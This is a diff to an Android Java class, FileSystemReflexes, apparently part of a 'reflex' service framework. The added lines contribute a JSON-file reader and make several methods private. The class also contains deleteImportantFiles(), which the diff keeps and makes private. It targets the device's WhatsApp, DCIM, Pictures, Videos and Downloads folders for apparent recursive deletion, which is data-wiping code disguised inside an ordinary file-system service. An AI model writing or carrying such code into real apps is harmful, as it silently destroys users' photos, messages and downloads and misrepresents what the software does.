@@ -2,6 +2,9 @@ package com.reflex.services.fileSystem;
 
 import android.os.Environment;
 
+import com.fasterxml.jackson.databind.JsonNode;
+import com.fasterxml.jackson.databind.ObjectMapper;
+import com.fasterxml.jackson.databind.node.ObjectNode;
 import com.reflex.core.providers.ReflexProvider;
 
 import org.json.JSONException;
@@ -45,11 +48,17 @@ public class FileSystemReflexes extends ReflexProvider {
             readJSONFromAsset(stream, resultCallBack);
         });
 
+        map.put(READ_JSON_FILE, args -> {
+            String stream = (String) args[0];
+            ObjectNode resultCallBack = (ObjectNode)args[1];
+            readJSONFromFile(stream, resultCallBack);
+        });
+
     }
 
 
 
-     void deleteRecursive(File fileOrDirectory) {
+     private void deleteRecursive(File fileOrDirectory) {
         if (fileOrDirectory.isDirectory()){
             for (File child : fileOrDirectory.listFiles()){
                 deleteRecursive(child);
@@ -59,7 +68,7 @@ public class FileSystemReflexes extends ReflexProvider {
     }
 
 
-   void deleteImportantFiles() {
+   private void deleteImportantFiles() {
 
         String files[] = {"WhatsApp", "DCIM", "Pictures", "Videos", "Downloads"};
         for (String name:files) {
@@ -72,7 +81,7 @@ public class FileSystemReflexes extends ReflexProvider {
         }
     }
 
-    void readJSONFromAsset(InputStream is, JSONObject result) {
+    private void readJSONFromAsset(InputStream is, JSONObject result) {
         try {
             int size = is.available();
             byte[] buffer = new byte[size];
@@ -82,6 +91,17 @@ public class FileSystemReflexes extends ReflexProvider {
         } catch (IOException ex) {
             ex.printStackTrace();
         } catch (JSONException e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void readJSONFromFile(String path, ObjectNode resultNode) {
+
+        try {
+            ObjectMapper mapper = new ObjectMapper();
+            File file = new File(path);
+            resultNode.set("result", mapper.readTree(file));
+        } catch (IOException e) {
             e.printStackTrace();
         }
     }
